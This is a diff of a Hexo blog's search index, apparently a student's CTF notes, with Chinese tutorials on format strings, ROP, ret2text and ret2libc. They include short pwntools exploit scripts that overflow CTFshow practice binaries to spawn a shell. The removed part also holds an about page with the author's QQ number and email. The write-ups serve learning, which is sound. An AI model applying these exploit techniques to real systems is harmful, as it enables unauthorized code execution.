@@ -1,639 +1,238 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
-    <url>/posts/d4f00467.html</url>
-    <content><![CDATA[今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存
-看一下左下角的时间，如果是now那就证明保存了
-另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了
-最后，感谢我磊哥再一次救我
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>初识格式化字符串（上）</title>
+      <link href="/posts/c6380b0f.html"/>
+      <url>/posts/c6380b0f.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-深入理解格式化字符串"><a href="#1-深入理解格式化字符串" class="headerlink" title="1.深入理解格式化字符串"></a>1.深入理解格式化字符串</h2><p>要想理解格式化字符串的原理，我们必须要知道的一个问题是，printf调用时，它的第一个参数是什么，比如<code>printf(&quot;%d %f\n&quot;, x, y);</code>，它的一参是x吗？</p><p>让我们来看看printf的声明，<code>int printf(const char *format, ...)</code>，没错，printf的一参是”%d %f\n”，即格式化字符串，这一点是很多同学都没有意识到的</p><p>我们必须要深刻理解的第二个问题是，什么是格式化字符串</p><blockquote><p>格式化字符串是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的<strong>函数</strong>，它通过用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。我补充一点，这里的转换说明即格式化占位符。</p></blockquote><p>（ps：不要因为长就不读了，反而要读得更仔细，通过学习pwn我认识到，越涉及到一个概念的本质，描述的文字就会越详细）</p><p>通俗的说，它就是包含格式化占位符的字符串</p><h2 id="2-格式化字符串的工作原理"><a href="#2-格式化字符串的工作原理" class="headerlink" title="2.格式化字符串的工作原理"></a>2.格式化字符串的工作原理</h2><p>我们平时使用printf时，格式化占位符是必须和后面的参数一一对应的，有多少个格式化占位符，就必须有多少个参数</p><p>这里必须再说一下printf是如何调用参数的。在64位系统中，我们的参数先会按照一定的顺序被放到6个寄存器里，从第7个参数往后，参数会被放在栈里；32位系统中，参数是直接被放到栈里保存的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a=1;</span><br><span class="line">int b=2;</span><br><span class="line">int c=3;</span><br><span class="line">printf(&quot;%d %d %d&quot;,a,b,c);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>在这段程序中，我们的参数先会按顺序被放到栈空间里保存，然后，printf会从栈空间里去找对应的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a=1;</span><br><span class="line">int b=2;</span><br><span class="line">int c=3;</span><br><span class="line">printf(&quot;%d %d %d&quot;,a,b);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>而我们去掉了参数c会发生什么呢</p><p>结果会是：1 2 一个很奇怪的数</p><p>因为有第三个%d的存在，printf会试图去栈或寄存器（原本c所在的位置）再取一个整数，但是显然是无法找到c的，于是就会随机地从错误的位置读取内存，就把这个奇怪的数翻了出来。这也侧面证明了printf是从栈里去寻址的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a=1;</span><br><span class="line">int b=2;</span><br><span class="line">int c=3;</span><br><span class="line">printf(&quot;%d %d %p&quot;,a,b);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>我们把占位符改成%p，输出的结果就是c在栈上的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">char a[]</span><br><span class="line">scanf(&quot;%s&quot;,&amp;)</span><br><span class="line">printf(a);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>更极端的情况如上</p><p>因此，我们可以利用格式化字符串实现可读可写</p><p>总结一下：格式化字符串漏洞的产生，就是参数和格式化占位符没有数量上的一一对应，即源代码里的格式化占位符少于参数的数量，于是我们就可以通过输入不同的格式化占位符，去打印栈空间里对应的内容</p>]]></content>
+      
+      
       <categories>
-        <category>碎碎念</category>
+          
+          <category> pwn入门 </category>
+          
       </categories>
-  </entry>
-  <entry>
-    <title>ret2text小tips</title>
-    <url>/posts/1111.html</url>
-    <content><![CDATA[exp模板
-from pwn import *io = remote(&quot;39.106.48.123&quot;, 29826)payload = b&quot;A&quot;*264 + p64(0x401202)io.sendline(payload)io.interactive()
-
-264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址
-注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 格式化字符串 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
+      <link href="/posts/d4f00467.html"/>
+      <url>/posts/d4f00467.html</url>
+      
+        <content type="html"><![CDATA[<p>今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存</p><p>看一下左下角的时间，如果是now那就证明保存了</p><p>另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了</p><p>最后，感谢我磊哥再一次救我</p>]]></content>
+      
+      
       <categories>
-        <category>pwn入门</category>
+          
+          <category> 碎碎念 </category>
+          
       </categories>
-      <tags>
-        <tag>ret2text</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初识ret2libc</title>
-    <url>/posts/b342ee9.html</url>
-    <content><![CDATA[从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。
-ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数实际放置的got表处
-egctfshow pwn入门39&amp;41这两个题思路是一样的，区别是39有bin&#x2F;sh，41有sh
-首先这个题是存在明显栈溢出的，而system和sh是有但是不在一起的
-
-
-这段payload首先填充了buf，然后把system地址改到了返回地址，然后把system的ret用四个字节填充了。为什么要填充4个字节呢，我们知道，32位系统传参是用栈传递的，我们用call调用函数时，call会把函数的返回地址压入栈中，函数调用结束后会执行ret指令，回到返回地址处。但我们并不希望system函数返回到某处，因此将返回地址填充上所谓的“虚假地址”，而返回地址往后是system函数的一参，也是我们希望sh在的地方。因此接下来把sh写到system函数的一参，就可以执行shll了
-
-]]></content>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>梦开始的地方</title>
+      <link href="/posts/1234.html"/>
+      <url>/posts/1234.html</url>
+      
+        <content type="html"><![CDATA[<p>我的博客搭建终于好了！</p><p>从今天起，我会在我的博客上分享我的<strong>wp</strong>，以及一些<strong>CTF的日常</strong>，希望和大家一起多多交流！</p>]]></content>
+      
+      
       <categories>
-        <category>pwn入门</category>
+          
+          <category> 碎碎念 </category>
+          
       </categories>
-      <tags>
-        <tag>ret2libc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初识ROP</title>
-    <url>/posts/2b89d936.html</url>
-    <content><![CDATA[如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。
-何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&#x2F;RIP，call所调用的函数结束后，ret会把返回地址弹出栈，程序会跳到ret指向的地址。
-
-出自《深入理解计算机系统（CSAPP）》第三章,要注意的一个问题是，国内外的计算机教材对于栈的画法是相反的，国外的教材更倾向于把栈倒过来画，即栈顶sp在下，栈底bp在上，栈向下增长（向下画）。不过并不影响实际的理解。
-接下来我们需要知道什么是gadget。gadget在英语里的翻译是小玩意，小装置的意思，在二进制领域，gadget就是一小段程序里已经有的，通常以ret结尾的汇编代码，注意这里的关键词，“一小段”，“已有的”，“以ret结尾的”，重点是后两个词，这就意味着我们可以通过一段又一段的gadget不断ret到程序内的不同地方。就算开了NX不让我们执行shellcode，但是程序里已经有的指令总不能不让我们执行吧，这就是gadget的用处。
-所以ROP就是一项通过构造一系列的gadget实现攻击的技术。
-再讲一下got表和plt表是什么，这一块牵扯到静态链接和动态链接，以及延迟绑定相关的内容。延迟绑定我还没有做到涉及的题目，所以暂时按下不表。
-静态链接就是把程序要用的函数，代码等直接写进了可执行文件里，在编译时加载，缺点就是文件的大小会比较大。动态链接会在程序启动时从动态链接库里调用函数，比如libc库。
-PLT表（Procedure Linkage Table，过程链接表），用于支持动态链接函数调用（例如 printf, puts, system等），相当于调用外部函数时的跳板。GOT表 （Global Offset Table全局偏移表）是在运行时保存动态库函数或全局变量实际地址的表。plt表经过一段复杂的过程后，会跳转并链接到got表，这里是存储函数的真实地址，动态链接器负责把libc的地址写进got表，got表会跳转到存放函数的真实地址。
-接下来我以CTFshow的pwn入门43题讲解一下ROP的使用
-
-这种情况下我们需要想办法自己构造出一个bin&#x2F;sh出来，我们首先需要知道程序的哪个地方存在可读可写的段。我们gdb程序，在main函数下断点并运行，使用vmmap指令
-
-果然.bss段里有一个buf2的变量，我们可以把bin&#x2F;sh写进去
-context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)io = process(&quot;./pwn43&quot;)gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420           break *0x08048450&#x27;&#x27;&#x27;)buf2 = 0x0804B060system = 0x08048450gets = 0x08048420payload= b&#x27;A&#x27;*(0x6c+0x4)payload += p32(gets)payload += p32(system)payload += p32(buf2)payload += p32(buf2)io.sendline(payload)io.sendline(b&quot;/bin/sh&quot;)io.interactive()
-
-来解释一下这段exp：第一步栈溢出，覆盖到EIP处，把EIP指向的返回地址改到gets处，再将gets的返回地址改为system，在调用完gets函数后，会弹出ret指令，ret到system的位置，第一个buf2作为gets的参数，我们的目的是通过gets将bin&#x2F;sh字符写入buf2，（io.sendline(b”&#x2F;bin&#x2F;sh”)就是把bin&#x2F;sh字符串通过gets函数读入buf里），而第二个buf2作为system的一参被调用，最后成功执行system bin&#x2F;sh获得shell
-我们用gdb调试一下，验证这段exp是否正确。
-我们在exp里，在gets函数和system函数处分别下一个断点，运行exp进入gdb调试界面，按c走到第一个断点之前
-
-这里的backtrace窗口简称bt窗口，可以显示当前程序的调用栈，即call stack，每一行都是一个栈帧，可以帮我们看函数调用的顺序
-我们可以看的非常清楚，我们的ebp已经被aaaa覆盖，eip被改到了gets函数处，esp栈顶被改到了system处，在栈窗口，system下方是我们覆盖的两个buf2
-
-我们继续按c，执行完gets函数，到system断点前，x&#x2F;s查看一下buf的内存，可以看到bin&#x2F;sh已经被成功写到buf2里了
-
-总结一下，本题属于典型的有system无bin&#x2F;sh或sh代替，需要我们自己在一段可读可写的内存里写入bin&#x2F;sh字符串，是非常经典的一道基本ret2libc题目，让我们初步认识了ROP的原理以及是如何构造的，如何找到可读可写的内存，plt表和got表是什么，动态链接和静态链接的过程分别是怎么样的，32位系统是如何通过栈传参的，栈是如何增长的，call和ret指令的本质是怎样的等
-]]></content>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>初识ret2libc</title>
+      <link href="/posts/b342ee9.html"/>
+      <url>/posts/b342ee9.html</url>
+      
+        <content type="html"><![CDATA[<p>从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。</p><p>ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数实际放置的got表处</p><p>egctfshow pwn入门39&amp;41<br>这两个题思路是一样的，区别是39有bin&#x2F;sh，41有sh</p><p>首先这个题是存在明显栈溢出的，而system和sh是有但是不在一起的</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b583a12117.png" alt="Snipaste_2025-11-05_21-59-53.png"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b58632beb8.png" alt="Snipaste_2025-11-05_22-00-37.png"></p><p>这段payload首先填充了buf，然后把system地址改到了返回地址，然后把system的ret用四个字节填充了。为什么要填充4个字节呢，我们知道，32位系统传参是用栈传递的，我们用call调用函数时，call会把函数的返回地址压入栈中，函数调用结束后会执行ret指令，回到返回地址处。但我们并不希望system函数返回到某处，因此将返回地址填充上所谓的“虚假地址”，而返回地址往后是system函数的一参，也是我们希望sh在的地方。因此接下来把sh写到system函数的一参，就可以执行shll了</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5886da79b.png" alt="Snipaste_2025-11-05_22-01-12.png"></p>]]></content>
+      
+      
       <categories>
-        <category>pwn入门</category>
+          
+          <category> pwn入门 </category>
+          
       </categories>
-      <tags>
-        <tag>ret2libc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/posts/0.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>初识格式化字符串（上）</title>
-    <url>/posts/c6380b0f.html</url>
-    <content><![CDATA[1.深入理解格式化字符串要想理解格式化字符串的原理，我们必须要知道的一个问题是，printf调用时，它的第一个参数是什么，比如printf(&quot;%d %f\n&quot;, x, y);，它的一参是x吗？
-让我们来看看printf的声明，int printf(const char *format, ...)，没错，printf的一参是”%d %f\n”，即格式化字符串，这一点是很多同学都没有意识到的
-我们必须要深刻理解的第二个问题是，什么是格式化字符串
-
-格式化字符串是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的函数，它通过用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。我补充一点，这里的转换说明即格式化占位符。
-
-（ps：不要因为长就不读了，反而要读得更仔细，通过学习pwn我认识到，越涉及到一个概念的本质，描述的文字就会越详细）
-通俗的说，它就是包含格式化占位符的字符串
-2.格式化字符串的工作原理我们平时使用printf时，格式化占位符是必须和后面的参数一一对应的，有多少个格式化占位符，就必须有多少个参数
-这里必须再说一下printf是如何调用参数的。在64位系统中，我们的参数先会按照一定的顺序被放到6个寄存器里，从第7个参数往后，参数会被放在栈里；32位系统中，参数是直接被放到栈里保存的。
-#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %d&quot;,a,b,c);return 0;
-在这段程序中，我们的参数先会按顺序被放到栈空间里保存，然后，printf会从栈空间里去找对应的数据
-#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %d&quot;,a,b);return 0;
-而我们去掉了参数c会发生什么呢
-结果会是：1 2 一个很奇怪的数
-因为有第三个%d的存在，printf会试图去栈或寄存器（原本c所在的位置）再取一个整数，但是显然是无法找到c的，于是就会随机地从错误的位置读取内存，就把这个奇怪的数翻了出来。这也侧面证明了printf是从栈里去寻址的
-#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %p&quot;,a,b);return 0;
-
-我们把占位符改成%p，输出的结果就是c在栈上的地址
-#include&lt;stdio.h&gt;char a[]scanf(&quot;%s&quot;,&amp;)printf(a);return 0;
-更极端的情况如上
-因此，我们可以利用格式化字符串实现可读可写
-总结一下：格式化字符串漏洞的产生，就是参数和格式化占位符没有数量上的一一对应，即源代码里的格式化占位符少于参数的数量，于是我们就可以通过输入不同的格式化占位符，去打印栈空间里对应的内容
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> ret2libc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>初识ROP</title>
+      <link href="/posts/2b89d936.html"/>
+      <url>/posts/2b89d936.html</url>
+      
+        <content type="html"><![CDATA[<p>如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。</p><p>何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&#x2F;RIP，call所调用的函数结束后，ret会把返回地址弹出栈，程序会跳到ret指向的地址。</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5571a395c.png" alt="Snipaste_2025-11-05_21-47-57.png"></p><p>出自《深入理解计算机系统（CSAPP）》第三章,要注意的一个问题是，国内外的计算机教材对于栈的画法是相反的，国外的教材更倾向于把栈倒过来画，即栈顶sp在下，栈底bp在上，栈向下增长（向下画）。不过并不影响实际的理解。</p><p>接下来我们需要知道什么是gadget。gadget在英语里的翻译是小玩意，小装置的意思，在二进制领域，gadget就是一小段程序里已经有的，通常以ret结尾的汇编代码，注意这里的关键词，“一小段”，“已有的”，“以ret结尾的”，重点是后两个词，这就意味着我们可以通过一段又一段的gadget不断ret到程序内的不同地方。就算开了NX不让我们执行shellcode，但是程序里已经有的指令总不能不让我们执行吧，这就是gadget的用处。</p><p>所以ROP就是一项通过构造一系列的gadget实现攻击的技术。</p><p>再讲一下got表和plt表是什么，这一块牵扯到静态链接和动态链接，以及延迟绑定相关的内容。延迟绑定我还没有做到涉及的题目，所以暂时按下不表。</p><p>静态链接就是把程序要用的函数，代码等直接写进了可执行文件里，在编译时加载，缺点就是文件的大小会比较大。动态链接会在程序启动时从动态链接库里调用函数，比如libc库。</p><p>PLT表（Procedure Linkage Table，过程链接表），用于支持动态链接函数调用（例如 printf, puts, system等），相当于调用外部函数时的跳板。GOT表 （Global Offset Table全局偏移表）是在运行时保存动态库函数或全局变量实际地址的表。plt表经过一段复杂的过程后，会跳转并链接到got表，这里是存储函数的真实地址，动态链接器负责把libc的地址写进got表，got表会跳转到存放函数的真实地址。</p><p>接下来我以CTFshow的pwn入门43题讲解一下ROP的使用</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b55c3c7f30.png" alt="Snipaste_2025-11-05_21-49-22.png"></p><p>这种情况下我们需要想办法自己构造出一个bin&#x2F;sh出来，我们首先需要知道程序的哪个地方存在可读可写的段。我们gdb程序，在main函数下断点并运行，使用vmmap指令</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b560fedca7.png" alt="Snipaste_2025-11-05_21-50-32.png"></p><p>果然.bss段里有一个buf2的变量，我们可以把bin&#x2F;sh写进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)</span><br><span class="line">io = process(&quot;./pwn43&quot;)</span><br><span class="line">gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420</span><br><span class="line">           break *0x08048450&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">buf2 = 0x0804B060</span><br><span class="line">system = 0x08048450</span><br><span class="line">gets = 0x08048420</span><br><span class="line">payload= b&#x27;A&#x27;*(0x6c+0x4)</span><br><span class="line">payload += p32(gets)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(b&quot;/bin/sh&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>来解释一下这段exp：第一步栈溢出，覆盖到EIP处，把EIP指向的返回地址改到gets处，再将gets的返回地址改为system，在调用完gets函数后，会弹出ret指令，ret到system的位置，第一个buf2作为gets的参数，我们的目的是通过gets将bin&#x2F;sh字符写入buf2，（io.sendline(b”&#x2F;bin&#x2F;sh”)就是把bin&#x2F;sh字符串通过gets函数读入buf里），而第二个buf2作为system的一参被调用，最后成功执行system bin&#x2F;sh获得shell</p><p>我们用gdb调试一下，验证这段exp是否正确。</p><p>我们在exp里，在gets函数和system函数处分别下一个断点，运行exp进入gdb调试界面，按c走到第一个断点之前</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5668a58ff.png" alt="Snipaste_2025-11-05_21-52-00.png"></p><p>这里的backtrace窗口简称bt窗口，可以显示当前程序的调用栈，即call stack，每一行都是一个栈帧，可以帮我们看函数调用的顺序</p><p>我们可以看的非常清楚，我们的ebp已经被aaaa覆盖，eip被改到了gets函数处，esp栈顶被改到了system处，在栈窗口，system下方是我们覆盖的两个buf2</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b56db7d3d8.png" alt="Snipaste_2025-11-05_21-53-44.png"></p><p>我们继续按c，执行完gets函数，到system断点前，x&#x2F;s查看一下buf的内存，可以看到bin&#x2F;sh已经被成功写到buf2里了</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b572e8e9ad.png" alt="Snipaste_2025-11-05_21-55-25.png"></p><p>总结一下，本题属于典型的有system无bin&#x2F;sh或sh代替，需要我们自己在一段可读可写的内存里写入bin&#x2F;sh字符串，是非常经典的一道基本ret2libc题目，让我们初步认识了ROP的原理以及是如何构造的，如何找到可读可写的内存，plt表和got表是什么，动态链接和静态链接的过程分别是怎么样的，32位系统是如何通过栈传参的，栈是如何增长的，call和ret指令的本质是怎样的等</p>]]></content>
+      
+      
       <categories>
-        <category>pwn入门</category>
+          
+          <category> pwn入门 </category>
+          
       </categories>
-      <tags>
-        <tag>格式化字符串</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>梦开始的地方</title>
-    <url>/posts/1234.html</url>
-    <content><![CDATA[我的博客搭建终于好了！
-从今天起，我会在我的博客上分享我的wp，以及一些CTF的日常，希望和大家一起多多交流！
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> ret2libc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>用gdb的动态视角看ret2text的实现</title>
+      <link href="/posts/2ee84d32.html"/>
+      <url>/posts/2ee84d32.html</url>
+      
+        <content type="html"><![CDATA[<p>来看一道非常简单的栈溢出</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b4fae7ce4b.png" alt="Snipaste_2025-11-05_21-22-13.png"></p><p>后门函数地址ida里很明显，0x8048521</p><p>exp本身不难写,下面看一下怎么用gdb确定偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=process(&quot;./pwn&quot;)</span><br><span class="line">#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);</span><br><span class="line">gdb.attach(io,&quot;b main&quot;) #在main函数下断点</span><br><span class="line">payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b52df75180.png" alt="Snipaste_2025-11-05_21-36-52.png"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b533859667.png" alt="Snipaste_2025-11-05_21-37-43.png"></p><p>0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）</p><p>用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量</p><p>我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b53386ffa9.png" alt="Snipaste_2025-11-05_21-37-58.png"></p>]]></content>
+      
+      
       <categories>
-        <category>碎碎念</category>
+          
+          <category> pwn入门 </category>
+          
       </categories>
-  </entry>
-  <entry>
-    <title>用gdb的动态视角看ret2text的实现</title>
-    <url>/posts/2ee84d32.html</url>
-    <content><![CDATA[来看一道非常简单的栈溢出
-
-后门函数地址ida里很明显，0x8048521
-exp本身不难写,下面看一下怎么用gdb确定偏移
-from pwn import*io=process(&quot;./pwn&quot;)#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);gdb.attach(io,&quot;b main&quot;) #在main函数下断点payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)io.sendline(payload)io.interactive()
-
-
-
-0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）
-用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量
-我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址
-
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> ret2text </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ret2text小tips</title>
+      <link href="/posts/1111.html"/>
+      <url>/posts/1111.html</url>
+      
+        <content type="html"><![CDATA[<p>exp模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&quot;39.106.48.123&quot;, 29826)</span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot;*264 + p64(0x401202)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址</p><p>注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位</p>]]></content>
+      
+      
       <categories>
-        <category>pwn入门</category>
+          
+          <category> pwn入门 </category>
+          
       </categories>
-      <tags>
-        <tag>ret2text</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/%E6%9C%AA%E5%91%BD%E5%90%8D.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>标签</title>
-    <url>/tags/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/about/index.html</url>
-    <content><![CDATA[关于我基本信息SDUST 大一学生CTFer 主要方向为pwn
-
-兴趣爱好足球 主队是山东泰山和曼城板绘 爱画一些二次元妹子，但实际上是个现充在看的书 《深入理解计算机系统（CSAPP）》
-
-联系我QQ 1935572185163邮箱 lzr20061008@163.com
-]]></content>
-  </entry>
-  <entry>
-    <title>分类</title>
-    <url>/archive/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/css/custom.css</url>
-    <content><![CDATA[/* @font-face {
-  font-family: Candyhome;
-  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);
-  font-display: swap;
-  font-weight: lighter;
-} */
-@font-face {
-  font-family: ZhuZiAYuanJWD;
-  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);
-  font-display: swap;
-  font-weight: lighter;
-}
-
-div#menus {
-  font-family: "ZhuZiAYuanJWD";
-}
-h1#site-title {
-  font-family: ZhuZiAYuanJWD;
-  font-size: 3em !important;
-}
-a.article-title,
-a.blog-slider__title,
-a.categoryBar-list-link,
-h1.post-title {
-  font-family: ZhuZiAYuanJWD;
-}
-
-.iconfont {
-  font-family: "iconfont" !important;
-  font-size: 3em;
-  /* 可以定义图标大小 */
-  font-style: normal;
-  -webkit-font-smoothing: antialiased;
-  -moz-osx-font-smoothing: grayscale;
-}
-
-/* 时间轴生肖icon */
-svg.icon {
-  /* 这里定义svg.icon，避免和Butterfly自带的note标签冲突 */
-  width: 1em;
-  height: 1em;
-  /* width和height定义图标的默认宽度和高度*/
-  vertical-align: -0.15em;
-  fill: currentColor;
-  overflow: hidden;
-}
-
-.icon-zhongbiao::before {
-  color: #f7c768;
-}
-
-/* bilibli番剧插件 */
-#article-container .bangumi-tab.bangumi-active {
-  background: var(--anzhiyu-theme);
-  color: var(--anzhiyu-ahoverbg);
-  border-radius: 10px;
-}
-a.bangumi-tab:hover {
-  text-decoration: none !important;
-}
-.bangumi-button:hover {
-  background: var(--anzhiyu-theme) !important;
-  border-radius: 10px !important;
-  color: var(--anzhiyu-ahoverbg) !important;
-}
-a.bangumi-button.bangumi-nextpage:hover {
-  text-decoration: none !important;
-}
-.bangumi-button {
-  padding: 5px 10px !important;
-}
-
-a.bangumi-tab {
-  padding: 5px 10px !important;
-}
-svg.icon.faa-tada {
-  font-size: 1.1em;
-}
-.bangumi-info-item {
